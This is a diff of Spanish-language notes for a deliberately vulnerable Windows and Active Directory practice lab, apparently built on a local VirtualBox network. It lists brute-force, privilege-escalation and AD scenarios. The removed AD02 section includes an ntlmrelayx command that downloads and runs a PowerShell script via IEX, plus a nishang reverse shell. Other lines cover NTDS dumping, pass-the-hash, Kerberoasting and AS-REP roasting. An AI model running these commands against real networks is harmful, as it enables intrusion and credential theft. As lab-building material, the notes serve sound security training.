@@ -1,64 +1,112 @@
-I1 - Hydra ssh - Configurado
-I2 - Hydra smb y esteganografía - Configurado
-I3 - Hydra SMB/FTP y ssh con id_rsa con/sin password - Configurado
-I4 - Hydra SMB y winrm - Configurado
-I5 - SMB Relay - Configurado - HACER CON TASKS
-I6 - FTP anonymous - Configurado
-I7 - FTP + id_rsa + local ftp anonymous- Configurado
-I8 - SNMP - No Configurado, como pongo el user en ep.ps1????
+I - Vulnerabilidades de intrusion
+EP - Vulnerabilidades de escalada de privilegios
+AD - Vulnerabilidades de Active Directory
 
-IX - SNMP(snmpwalk)
+Lista:
+
+I01 - Hydra ssh - Configurado
+I02 - Hydra smb y esteganografía - Configurado
+I03 - Hydra FTP y ssh con id_rsa - Configurado
+I04 - Hydra SMB y winrm - Configurado
+I05 - SMB Relay - Configurado - HACER CON TASKS
+I06 - FTP anonymous - Configurado
+I07 - FTP + id_rsa + local ftp anonymous - Configurado
+I08 - SNMP - Configurado
+
+I0X - SNMP(snmpwalk)
 
 
-
-EP1 - nc.exe - Configurado
-EP2 - cmstp.exe - Configurado
-EP3 - wuauclt.exe - Configurado
-EP4 - msiexec.exe - Configurado
-EP5 - SeBackupPrivilege(reg.exe) - Configurado
-EP6 - tttracer.exe - Configurado
-EP7 - rundll32.exe - Configurado
-EP8 - Mimikatz - No Configurado, no puedo ejecutar cmdkeys de forma remota 
+EP01 - nc.exe - Configurado
+EP02 - cmstp.exe - Configurado
+EP03 - wuauclt.exe - Configurado
+EP04 - msiexec.exe - Configurado
+EP05 - SeBackupPrivilege(reg.exe) - Configurado
+EP06 - tttracer.exe - Configurado
+EP07 - rundll32.exe - Configurado
+EP08 - Mimikatz - No Configurado, no puedo ejecutar cmdkeys de forma remota 
 EP09 - start menu(Modificar archivo) - Configurado
-EP10 - start menu(Crear ps1 en el path) - Configurado
-
-AD01 - smb relay + john - Configurado
-AD02 - pass the hash - Configurado
+EP010 - start menu(Crear ps1 en el path) - Configurado
 
 
-AD: 
 
-AD01: smb relay + john:
-    -Configuracion:
-        - activar comandos smb en enterprise
-        - ls \\share\\saf lo tiene k hacer el admin del AD, ¿desde DC?
-        - Habilitar rdesktop
-    -Comandos:
-        - nano /etc/responder/responder.conf -> Smb y http a Off
-        - crackmapexec smb 192.168.56.0/24 -> para saber ips y guardarlas en .txt
-        - sudo responder -I vboxnet0 -dw
-        - ntlmrelayx.py -tf ips.txt -smb2support
-        - y espero a k acceda a un recurson compartido inexistente para obtener la SAM 
-        - john -w pass.txt 192.168.56.253_samhashes.sam --format=NT
-        - john 192.168.56.253_samhashes.sam --format=NT --show
+AD01 - SMB relay + dump SAM + EP - Configurado
+AD02 - Pass the hash + EP
+AD03 - Enumeracion rpcclient + Golden Ticket (file.ccache) - Configurado 
+AD04 - Kerberos - No Configurado, falta poner alguna cosa mas 
+AD05 - ASRPtoast - No Configurado, falta poner alguna cosa mas
 
-AD02: smb relay + ntlmrelayx.py:(pass the hash)
-    -Configuracion:
-        - activar comandos smb en enterprise
-        - ls \\share\\saf lo tiene k hacer el admin del AD, ¿desde DC?
-        - la pass del usuario random
-    -Comandos:
-        - nano /etc/responder/responder.conf -> Smb y http a Off
-        - Hacer pasos AD01 pero como no consigo pass, hacer esto.
-        - crackmapexec smb 192.168.56.0/24 -> para saber ips y guardarlas en .txt
-        - sudo responder -I vboxnet0 -dw
-        - ntlmrelayx.py -tf ips.txt -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.56.1:8000/PS.ps1')"
-        - python3 -m http.server
-        - nc -lvp PORT o rlwrap nc -lvp PORT, el puerto tiene que ser igual que el comando del archivo de nishang
-        - Descargar nishang: git clone https://github.com/samratashok/nishang.git
-        - ./nishang/Shells/Invoke-PowerShellTcp.ps1 .PS.ps1
-        - y espero a k acceda a un recurson compartido inexistente para obtener la SAM 
-        - Estoy dentro 
+
+
+
+ADX - Bloodhound - No Configurado
+
+
+
+
+Explicacion:
+
+I01 - Hydra ssh:
+Consiste en hacer fuerza bruta al protocolo ssh para obtener las credenciales.
+
+I02 - Hydra smb y esteganografía:
+Consiste en hacer fuerza bruta al protocolo smb, entrar y descargar una imagen, la cual tiene escondida un zip concontraseña. Romperla con john y obtienes credenciales de acceso.
+
+I03 - Hydra FTP y ssh con id_rsa:
+Consiste en hacer fuerza bruta al protocolo FTP. Al tener privilegios de escritura en un directorio de usuario, crear carpeta .ssh e introducir un archivo authorized_keys con una clave publica creada previamente para entrar por ssh sin passwords.
+
+I04 - Hydra SMB y winrm:
+Consiste en hacer fuerza bruta al protocolo smb y obtener un archivo con credenciales y hacer la intrusion por winrm(evil-winrm)
+
+I05 - SMB Relay:
+Consiste en desplegar el responder para obtener un hash y romperlo con john.
+
+I06 - FTP anonymous
+Consiste en entrar al servidor ftp sin credenciales, ya que esta la conexion como anonymous activada y obtener credenciales.
+
+I07 - FTP + id_rsa + local ftp anonymous:
+Consiste en hacer fuerza bruta al protocolo FTP y acceder con permisos de escritura, crear carpeta .ssh e introducir un archivo authorized_keys con una clave publica creada previamente para entrar por ssh sin passwords. Una vez dentro, escanear los puertos abiertos y entrar en otro servidor ftp local, como anoymous y obtener credenciales de otro usuario.
+
+I08 - SNMP:
+Consiste en hacer el escaneo de puertos por el protocolo UDP, y hacer un nmap con los parametros -sCV para obtener los usuarios del PC y poder hacer con esa lista de usuarios un ataque de fuerza bruta al protocolo ssh y obtener credenciales.
+
+
+EP01 - nc.exe:
+Consiste en poder ejecutar el archivo nc.exe con privilegios administrador y poder hacer la EP0.
+
+EP02 - cmstp.exe:
+Consiste en poder ejecutar el archivo cmstp.exe con privilegios administrador y poder hacer la EP0 como dice la pagina lolbas: https://lolbas-project.github.io/
+
+EP03 - wuauclt.exe:
+Consiste en poder ejecutar el archivo wuauclt.exe con privilegios administrador y poder hacer la EP0 como dice la pagina lolbas: https://lolbas-project.github.io/
+
+EP04 - msiexec.exe:
+Consiste en poder ejecutar el archivo msiexec.exe con privilegios administrador y poder hacer la EP0 como dice la pagina lolbas: https://lolbas-project.github.io/
+
+EP05 - SeBackupPrivilege(reg.exe):
+Consiste en poder ejecutar el archivo reg.exe con privilegios administrador y poder hacer la EP0 como dice la pagina lolbas: https://lolbas-project.github.io/
+
+EP06 - tttracer.exe:
+Consiste en poder ejecutar el archivo tttracer.exe con privilegios administrador y poder hacer la EP0 como dice la pagina lolbas: https://lolbas-project.github.io/
+
+EP07 - rundll32.exe:
+Consiste en poder ejecutar el archivo rundll32.exe con privilegios administrador y poder hacer la EP como dice la pagina lolbas: https://lolbas-project.github.io/
+
+EP09 - start menu(Modificar archivo):
+Se tiene privilegios de escritura en el directorio  C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp, entonces podemos crear un .ps1 para obtener una reverse shell y cuando un usuario(en este caso el administrador) inicie sesion en el PC, podemos entrar como ese usuario.
+
+EP010 - start menu(Crear ps1 en el path)
+Se puede leer el los archivos en el directorio C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp, por lo que podemos ver el codigo y este codgio ejecuta otro archivo. En ese archivo, se tiene privilegios de escritura, por lo que se puede poner un comando y asi poder hacer una reverse shell y conectarnos como el usuario que inicie sesion (en este caso el administrador).
+
+
+
+AD01 - SMB relay + dump SAM:
+
+
+AD02 - Pass the hash:
+
+AD03 - Enumeracion rpcclient
+
+
 
 
 
@@ -75,7 +123,7 @@ IP  genwin genwin.local DC-Company
 
 Validar credenciales : crackmapexec smb 192.168.56.0/24 -u "user" -p "pass*"
 
-Dumpear SAM del DC cuando tienen credenciales administrador:
+Dumpear SAM del DC cuando tienen credenciales administrador: -> EP de ad01???
 crackmapexec smb IP-DC -u "user" -p "pass" --ntds vss
 
 Pass the hash ejemplo:
@@ -89,7 +137,7 @@ rpcclient -U "domain\user%pass" IP -c enumdomusers
 or
 rpcclient -U "domain\user%pass" IP y se ponen luego los comandos 
 +
-rpcclient -U "genwin.local\d.delbarrio%daniel" 192.168.56.252 -c "queryuser 0x44f" -> Para obtener descripcion? Mirar en video, min 56 el bucle 
+rpcclient -U "genwin.local\d.delbarrio%daniel" 192.168.56.252 -c "queryuser 0x44f" -> Para obtener descripcion? Mirar en video, min 53 el bucle 
 
 
 Obtener mucha info con credenciales validas:
@@ -103,11 +151,11 @@ Kerberos:
 Usuario kerberoasteable:1:03:00
 Configurar:setspn -a genwin.local/user.DC-Company genwin.local\user
 Ahora con cualquier credencial:
-GetUserSPNs.pygenwin.local/user:pass
-GetUserSPNs.pygenwin.local/user:pass -request -> sale el hash TGS del usuario, este hash se puede romper con john 
+GetUserSPNs.py genwin.local/user:pass
+GetUserSPNs.py genwin. local/user:pass -request -> sale el hash TGS del usuario, este hash se puede romper con john 
 
 
-ASRPtoast:
+ASRPtoast:  
 Si el AD tiene el Null session habilitado:1:06:58
 GetNpUser.py genwin.local/ -mo-pass -usersfile users.txt -> enumerar usuarios con rpcclient?
 Como configurar usuarios?? 
